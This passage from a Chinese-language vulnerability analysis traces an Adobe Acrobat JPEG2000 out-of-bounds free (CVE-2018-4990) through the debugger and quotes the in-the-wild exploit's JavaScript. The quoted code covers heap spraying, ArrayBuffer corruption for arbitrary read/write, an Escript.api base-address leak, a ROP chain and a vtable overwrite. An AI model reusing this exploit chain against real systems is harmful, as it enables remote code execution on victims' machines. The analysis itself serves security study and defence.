+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200628121347978.png" alt="image-20200628121347978"></p>
+<p>可以看到这是一个循环释放内存的过程，<code>sub_10066FEA</code>函数即调用了<code>free</code>函数。将代码整理一下可以得到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// base = *(*(v112 + 0x48) + 0xc)</span></span><br><span class="line"><span class="comment">// max_count = *(*(v112 + 0x48) + 4)</span></span><br><span class="line"><span class="keyword">if</span> ( *(v113 + <span class="number">0xc</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(v113 + <span class="number">4</span>) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*(base + <span class="number">4</span> * count))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(*(base + <span class="number">4</span> * count));</span><br><span class="line">        *(base + <span class="number">4</span> * count) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( count &lt; max_count );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*(base));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>do,while</code>循环的逻辑如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200628123642424.png" alt="image-20200628123642424"></p>
+<p>逻辑很清晰了，base是一个堆块地址的数组，在这个循环中依次释放数组中保存的堆块地址。在windbg中看一下运行过程。关闭全页堆，设置延迟求解的断点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sxe ld JP2KLIB</span><br><span class="line">g</span><br><span class="line">bu JP2KLib+50588 <span class="string">&quot;dd eax+4 l1; g;&quot;</span>//获取max_count的值</span><br><span class="line">bu JP2KLib+50567 <span class="string">&quot;r eax; r ecx; g;&quot;</span>//获取base和当前的count</span><br><span class="line">bu JP2KLib+5056e <span class="string">&quot;r eax; g;&quot;</span>//获取将要释放的堆块指针</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629103134737.png" alt="image-20200629103134737"></p>
+<p><code>max_count</code>的值为<code>0xff</code>，我们发现只有在最后释放了两个堆块<code>0x0d0e0048,0x0d0f0048</code>，而这个两个地址是存在于漏洞利用代码中的。接下来我们分析一下为什么会释放这两个地址的堆块。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu JP2KLib+50567 <span class="string">&quot;r eax; r ecx; .if(ecx&gt;=fd)&#123;&#125;.else&#123;g;&#125;;&quot;</span>//获取base和当前的count</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629103636023.png" alt="image-20200629103636023"></p>
+<p><code>eax</code>即表示的是<code>base</code>的值即堆块数组的起始地址，而<code>base</code>被分配的大小是<code>0x3f4</code>也就是<code>while</code>循环可以遍历<code>0-0x3f4</code>之间的内容，而这里<code>max_count</code>的最大值为<code>0xff</code>，<code>while</code>循环可以遍历到<code>0-0xff*4</code>即<code>0-0x3fc</code>之间的内容，因此会越界访问两个内存指针，也就是8字节的内容。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629104232347.png" alt="image-20200629104232347"></p>
+<p>而这两个地址恰好是攻击者精心布局之后的地址。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629104428253.png" alt="image-20200629104428253"></p>
+<h4 id="恶意JP2K"><a href="#恶意JP2K" class="headerlink" title="恶意JP2K"></a>恶意JP2K</h4><p>那么这个<code>eax</code>指向的内存是怎么分配出来的呢，通过IDA的追踪我们发现<code>eax</code>指向的内存来自函数<code>sub_10066EFD</code>，这里将分配得到的内存记为<code>base</code></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629113605062.png" alt="image-20200629113605062"></p>
+<p>进入到函数中，我们发现其返回值来自于一个函数指针的调用</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629113708137.png" alt="image-20200629113708137"></p>
+<p>对应的汇编指令如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629113825493.png" alt="image-20200629113825493"></p>
+<p>这里是一个间接函数调用，通过调试发现似乎所有的内存申请都是通过该间接调用来完成的。为了找到<code>0x3f4</code>和<code>0xff</code>的数据来源，我们通过在<code>base+0x48</code>和<code>*(base+0x48)+0xc</code>处下内存断点，找到相关的函数。首先在该函数处(4F692)下断点，得到分配的内存地址之后，在偏移<code>0x48</code>的位置下内存断点。找到<code>base+0x48</code>偏移位置分配内存的函数。也可以开启<code>UST (gflags /i Acrobat.exe +ust)</code>通过分析<code>!heap -p -a alloc_heap_address</code>产生的<code>StackTrace</code>来完成。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u <span class="number">5f</span>0612b5 l20</span><br><span class="line">JP2KLib!JP2KCodeStm::write+<span class="number">0x17db5</span>:</span><br><span class="line"><span class="number">5f</span>0612b5 <span class="number">3b</span>5dfc          cmp     ebx,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">5f</span>0612b8 <span class="number">0f</span>8259090000    jb      JP2KLib!JP2KCodeStm::write+<span class="number">0x18717</span> (<span class="number">5f</span>061c17)</span><br><span class="line"><span class="number">5f</span>0612be <span class="number">8b</span>d9            mov     ebx,ecx</span><br><span class="line"><span class="number">5f</span>0612c0 c1eb02          shr     ebx,<span class="number">2</span></span><br><span class="line"><span class="number">5f</span>0612c3 <span class="number">6</span>a04            push    <span class="number">4</span></span><br><span class="line"><span class="number">5f</span>0612c5 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">5f</span>0612c6 e8325c0200      call    JP2KLib!JP2KTileGeometryRegionIsTile+<span class="number">0xcb</span> (<span class="number">5f</span>086efd)</span><br><span class="line"><span class="number">5f</span>0612cb <span class="number">837f</span>4800        cmp     dword ptr [edi+<span class="number">48</span>h],<span class="number">0</span></span><br><span class="line"><span class="number">5f</span>0612cf <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">5f</span>0612d0 <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">5f</span>0612d1 <span class="number">8945f</span>8          mov     dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">5f</span>0612d4 <span class="number">7516</span>            jne     JP2KLib!JP2KCodeStm::write+<span class="number">0x17dec</span> (<span class="number">5f</span>0612ec)</span><br><span class="line"><span class="number">5f</span>0612d6 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">5f</span>0612d8 <span class="number">6</span>a20            push    <span class="number">20</span>h</span><br><span class="line"><span class="number">5f</span>0612da e81e5c0200      call    JP2KLib!JP2KTileGeometryRegionIsTile+<span class="number">0xcb</span> (<span class="number">5f</span>086efd)</span><br><span class="line"><span class="number">5f</span>0612df <span class="number">894748</span>          mov     dword ptr [edi+<span class="number">48</span>h],eax</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703103610816.png" alt="image-20200703103610816"></p>
+<p>这里看到分配了两个空间大小，分配空间的函数是<code>sub10066EFD</code>，该函数有两个参数，第一个参数是空间的大小。首先是第一个分配，可以看到空间大小的参数来自于<code>ebx</code>，<code>ebx</code>的数值来源于<code>ecx/4</code>，向上回溯可以看到<code>ecx</code>的值来自于<code>ebp-0x10</code>位置的值，大小为<code>0x3f4</code></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703104202688.png" alt="image-20200703104202688"></p>
+<p>即最终调用<code>10066EFD(0xfd, 4)</code>，返回的内存大小是</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703104409984.png" alt="image-20200703104409984"></p>
+<p>随后将分配的内存地址保存在<code>ebp-0x8</code>的位置，接下来分配了<code>0x20</code>大小的内存空间，将地址保存在了<code>base+0x48</code>的位置，对<code>*(base+0x48)+0xc</code>的位置下内存断点，可以找到内存分配的位置</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703104901273.png" alt="image-20200703104901273"></p>
+<p>我们可以看到该位置的内存就是保存在<code>ebp-0x8</code>位置的内存地址</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703105035059.png" alt="image-20200703105035059"></p>
+<p>那么<code>0x3f4</code>是怎么来的呢，我们继续向上回溯，发现该值来自于<code>ebp-0x14</code>与<code>ebp-0x4</code>之间的差值</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703110256510.png" alt="image-20200703110256510"></p>
+<p>而两个位置的变量的值来自于函数<code>3FD93</code>，我们看一下函数</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703110548086.png" alt="image-20200703110548086"></p>
+<p><code>a1</code>也就是<code>ebp-0x14</code>处的值来自于函数<code>1000B31B</code>，<code>a3=8</code>或者<code>a3=16</code>，最终调试之后发现<code>a3=8</code>。我们看一下函数<code>1000B21A</code></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703111352191.png" alt="image-20200703111352191"></p>
+<p>可以看到返回值来自于<code>esi+0x10</code>的取值。在调用函数<code>40DF0</code>处下断点，之后在<code>1003FDB2</code>处下断点，这个时候调用<code>B31B</code>函数就会返回<code>0x3fc</code>，我们跟进调试一下。<code>B31B</code>函数根据传递的参数决定读取的字节数(4)，将所有的数值相加即得到最终的返回结果。从<code>B21A</code>函数的反汇编代码来看，函数的返回值主要是读取的<code>*(*(esi+0x10))</code>处存储的一个字节的值。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703125544101.png" alt="image-20200703125544101"></p>
+<p>从多次调试的结果来看，<code>esi</code>指向的是一个<code>JP2k</code>的对象，偏移<code>0xc</code>的位置存储了图片文件数据的起始地址，偏移<code>0x10</code>的位置存储了当前读取的位置，偏移<code>0x14</code>存储了文件结束的位置，偏移<code>0x1c</code>处存储了已经读取的数据的大小。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703125847368.png" alt="image-20200703125847368"></p>
+<p>最终读取了文件偏移<code>0x2a-0x2d</code>处的四字节。那么最终申请的内存空间的大小即<code>0x3fc-0x8=0x3f4</code>。</p>
+<p>接下来看一下<code>0xff</code>是怎么获取的。在<code>*(base+0x48)+0xc</code>处下内存断点，找到赋值的代码段。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703132145988.png" alt="image-20200703132145988"></p>
+<p>我们可以看到<code>0xff</code>的数值来自于<code>esi+0x18</code>处存储的一个字节，从上面对于<code>B21A</code>函数的分析来看，<code>esi+0x18</code>处存储的数据是<code>*(*(esi+0x10))</code>处的数据，也就是<code>JP2K</code>文件中的数据。这里推测是由于<code>pclr</code>之后应该仍然存在数据，强行截断之后造成越界读取。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703132715866.png" alt="image-20200703132715866"></p>
+<p>到这里就知道了造成越界释放两个内存指针的数据<code>0x3f4,0xff</code>均来自于攻击者精心构造的恶意数据。</p>
+<p>这里需要注意的是PdfStreamDumper好像无法观察到JP2K图片的二进制数据。</p>
+<h4 id="重用已经释放的内存"><a href="#重用已经释放的内存" class="headerlink" title="重用已经释放的内存"></a>重用已经释放的内存</h4><p>我们在内存释放的位置下断点</p>
+<p>断点断在越界访问释放内存的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu JPKLIB+5056E</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629143253608.png" alt="image-20200629143253608"></p>
+<p>此时两个堆块都处于占用状态，每一个堆块的大小为<code>0x2000*8=0x10000</code>（该堆段的分配粒度为8bytes，<code>!heap 440000 -v</code>），接下来释放第一个堆块<code>0x0d0e0048</code></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629144257889.png" alt="image-20200629144257889"></p>
+<p>释放第二个堆块<code>0x0d0f0048</code></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629144417026.png" alt="image-20200629144417026"></p>
+<p>我们发现两个堆块发生了合并，合并后的大小为<code>0x20000</code>。在<code>fun1</code>函数中<code>0x200</code>数组的申请可能是为了消耗内存使得脚本申请的内存空间落在a1数组中。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f1 = <span class="variable language_">this</span>.<span class="title function_">getField</span>(<span class="string">&quot;Button1&quot;</span>);<span class="comment">//导致任意地址释放的漏洞触发脚本</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里其实我们可以发现分配给eax的内存恰好是a1中存在的某个hole (重启调试，分配的内存值改变0x7bcda10)</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701230052084.png" alt="image-20200701230052084"></p>
+</blockquote>
+<p>通过下面的代码将上述<code>0x20000</code>的堆块进行重用。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1=<span class="number">1</span>;i1&lt;<span class="number">0x40</span>;i1++)</span><br><span class="line">&#123;		</span><br><span class="line">    sprayarr2[i1] = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20000</span>-<span class="number">24</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701231405675.png" alt="image-20200701231405675"></p>
+<p>看到<code>sprayarr</code>数组的第一个元素就重用了堆块。这里之所以是<code>0x0d0e0058</code>,是因为其要减去<code>0x10</code>的<code>Buffer</code>头，再减去<code>0x8</code>的HeapEntry。此时释放前<code>0x0d0e0048,0d0f0048</code>分别代表一个长度为<code>0x1000-24</code>大小的<code>ArrayBuffer</code>，在UAF之后变成了一个代表长度为<code>0x20000-24</code>大小的<code>ArrayBuffer</code>。从代码中可以得到此时<code>sprayaar</code>数组中的某一个<code>ArrayBuffer</code>（0x0d0e0048）已经被修改为了<code>0x2000-24</code>，长度改变之后就可以通过该<code>ArrayBuffer</code>越界访问修改临近的<code>ArrayBuffer</code>（0x0d0f0048）的长度为<code>0x66666666</code>，实现全局内存的读写。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200629151809292.png" alt="image-20200629151809292"></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200701220044712.png" alt="image-20200701220044712"></p>
+<h4 id="泄露Escript-api基址"><a href="#泄露Escript-api基址" class="headerlink" title="泄露Escript.api基址"></a>泄露Escript.api基址</h4><p>接下来我们观察一下后续代码的执行。我们对viewContent中的设置如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">viewContent[<span class="number">0</span>] = <span class="number">0x12345678</span>;</span><br><span class="line">viewContent[<span class="number">1</span>] = sprayarr;</span><br><span class="line">viewContent[<span class="number">2</span>] = a1;</span><br><span class="line">viewContent[<span class="number">3</span>] = sprayarr2;</span><br><span class="line">viewContent[<span class="number">4</span>] = sprayarr2;</span><br><span class="line">viewContent[<span class="number">5</span>] = i1;</span><br><span class="line">viewContent[<span class="number">6</span>] = arr1;</span><br><span class="line">viewContent[<span class="number">7</span>] = i2;</span><br><span class="line">viewContent[<span class="number">8</span>] = itmp;</span><br></pre></td></tr></table></figure>
+
+<p>内存中的值如下</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702155847408.png" alt="image-20200702155847408"></p>
+<p>在获得全局读写能力之后，攻击者尝试获取动态链接库的地址，我们看一下地址的获取过程</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2=<span class="number">0x10</span>;i2&lt;<span class="number">0x10000</span>;i2++)</span><br><span class="line">    arr1[i2] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2 = <span class="number">1</span>;i2&lt;<span class="number">0x10</span>;i2++)</span><br><span class="line">&#123;</span><br><span class="line">    arr1[i2] = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(sprayarr[i1+i2]);</span><br><span class="line">    arr1[i2][<span class="number">0</span>] = i2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2=<span class="number">0x30000</span>;i2&lt;<span class="number">0x10000</span>*<span class="number">0x10</span>;i2=i2+<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( biga.<span class="title function_">getUint32</span>(i2,<span class="literal">true</span>)==spraylen &amp;&amp; biga.<span class="title function_">getUint32</span>(i2+<span class="number">4</span>,<span class="literal">true</span>) &gt; spraypos  )</span><br><span class="line">    &#123;</span><br><span class="line">        mydv = biga;</span><br><span class="line">        <span class="keyword">var</span> itmp = mydv.<span class="title function_">getUint32</span>(i2+<span class="number">12</span>,<span class="literal">true</span>);</span><br><span class="line">        myarray = arr1[itmp];</span><br><span class="line">        mypos = biga.<span class="title function_">getUint32</span>(i2+<span class="number">4</span>,<span class="literal">true</span>) - spraypos +<span class="number">0x50</span>;</span><br><span class="line">        mydv.<span class="title function_">setUint32</span>(mypos-<span class="number">0x10</span>,<span class="number">0x100000</span>,<span class="literal">true</span>);</span><br><span class="line">        myarraybase = mydv.<span class="title function_">getUint32</span>(mypos,<span class="literal">true</span>);						</span><br><span class="line">        <span class="keyword">var</span> rop1 = [<span class="number">0x6b78845b</span>,<span class="number">0x6b78845b</span>,<span class="number">0x6b78845a</span>,<span class="number">0x6b7d7084</span>,<span class="number">0x6b651767</span>,<span class="number">0x6b64230d</span>,myarraybase,<span class="number">0x6b65ecaf</span>,<span class="number">0x6b663a4b</span>,myarraybase,<span class="number">0x00010201</span>,<span class="number">0x00001000</span>,<span class="number">0x00000040</span>,<span class="number">0xcccccccc</span>,<span class="number">0x41414141</span>];</span><br><span class="line">        <span class="keyword">var</span> obj1 = <span class="title function_">myread</span>(myarraybase-<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">var</span> obj2 = <span class="title function_">myread</span>(obj1+<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> obj3 = <span class="title function_">myread</span>(obj2);</span><br><span class="line">        <span class="keyword">var</span> dll_base = (<span class="title function_">myread</span>(obj3+<span class="number">8</span>)-<span class="number">0x00010000</span> )&amp;<span class="number">0xffff0000</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先，创建了一个<code>arr1</code>的<code>Array</code>对象，将<code>sprayarr[i]</code>之后的内存块创建<code>Unit32Array</code>对象，设置第一个元素为索引值。这里的<code>i1</code>就是<code>sprayarr</code>中<code>0x0d0f0048</code>的索引值。从<code>0d0f0058</code>开始偏移<code>0x30000</code>的内存地址开始查找两个值，这里其实就是从<code>sprayarr[i+3]</code>的位置开始查找，最终查找到的偏移值是<code>0x3fff4</code></p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702164953395.png" alt="image-20200702164953395"></p>
+<p>发现最终符合要求的是<code>0d0f0048</code>之后的低四个堆块，由于是一个<code>Unit32Array.buffer</code>结构，因此我们可以得到一个指向<code>Unit32Array</code>结构的指针。<code> mydv.setUint32</code>最终修改的是<code>biga.getUint32(i2+4,true) - spraypos +0x50 - 0x10 + mydv.base = 0x1ac97138 - 0x0d0f0058 + 0x50 - 0x10 + 0x0d0f0058</code>即<code>Unit32Array</code>偏移<code>0x40</code>位置的值（表示空间大小的变量），可以看到这里已经被改为了<code>0x10000</code>。将<code>Unit32Array.buffer</code>的指针赋值给<code>myarraybase</code>。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702170721837.png" alt="image-20200702170721837"></p>
+<p>从<code>ida</code>中我们可以得知<code>0x65a83f5c</code>是全局变量存储的位置，该位置存储了一些函数指针（推测应该是结构体相关的方法函数指针），通过这些函数指针即可以推算出<code>Escript.api</code>的加载基址。这里通过分析，我们可以得知<code>Unit32Array</code>数据结构中的前8字节存储的两个指针，第一个指针指向的是其上一层的数据结构（以a1为例，即Array数据结构）的虚函数表，第二个函数指针则指向该结构的虚函数表。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702173246575.png" alt="image-20200702173246575"></p>
+<h4 id="劫持程序流，ROP执行载荷"><a href="#劫持程序流，ROP执行载荷" class="headerlink" title="劫持程序流，ROP执行载荷"></a>劫持程序流，ROP执行载荷</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bkm = <span class="variable language_">this</span>.<span class="property">bookmarkRoot</span>;		</span><br><span class="line"><span class="keyword">var</span> objescript = <span class="number">0x23A59BA4</span>-<span class="number">0x23800000</span> + dll_base;</span><br><span class="line">objescript = <span class="title function_">myread</span>(objescript); <span class="comment">//获取0x23A59BA4处的全局变量值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i2=<span class="number">0</span>;i2&lt; rop1.<span class="property">length</span> ;i2=i2+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myarray[i2+<span class="number">3</span>] = rop1[i2] &gt;  <span class="number">0x6b640000</span> ?(rop1[i2] - <span class="number">0x6b640000</span> +dll_base):rop1[i2];</span><br><span class="line">&#125;</span><br><span class="line">myarray[i2+<span class="number">3</span>-<span class="number">2</span>] = <span class="number">0x90909090</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i3=<span class="number">0</span>;i3&lt; dlldata.<span class="property">length</span> ;i3=i3+<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myarray[i2+<span class="number">3</span>+i3] = dlldata[i3];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">mywrite</span>(objescript, <span class="number">0x6b707d06</span>-<span class="number">0x6b640000</span>+dll_base); </span><br><span class="line"><span class="title function_">mywrite</span>(objescript+<span class="number">4</span>,myarraybase);</span><br><span class="line"><span class="title function_">mywrite</span>(objescript+<span class="number">0x598</span>,<span class="number">0x6b68389f</span>-<span class="number">0x6b640000</span>+dll_base);</span><br><span class="line">bkm.<span class="title function_">execute</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>myarray</code>的值是<code>0x0d0f0058</code>。也就是攻击者将<code>rop</code>和载荷写入到了<code>0d0f0058</code>内存空间中，<code>rop</code>和载荷之间存在着滑板指令。攻击者更改了虚函数表中的内容（这里通过截断初始代码构造出pop esp）</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702181930219.png" alt="image-20200702181930219"></p>
+<p><code>0x6b68389f-0x6b640000+dll_base</code>代码内容为（这里重启调试，基址改变69de0000 ）</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702183636563.png" alt="image-20200702183636563"></p>
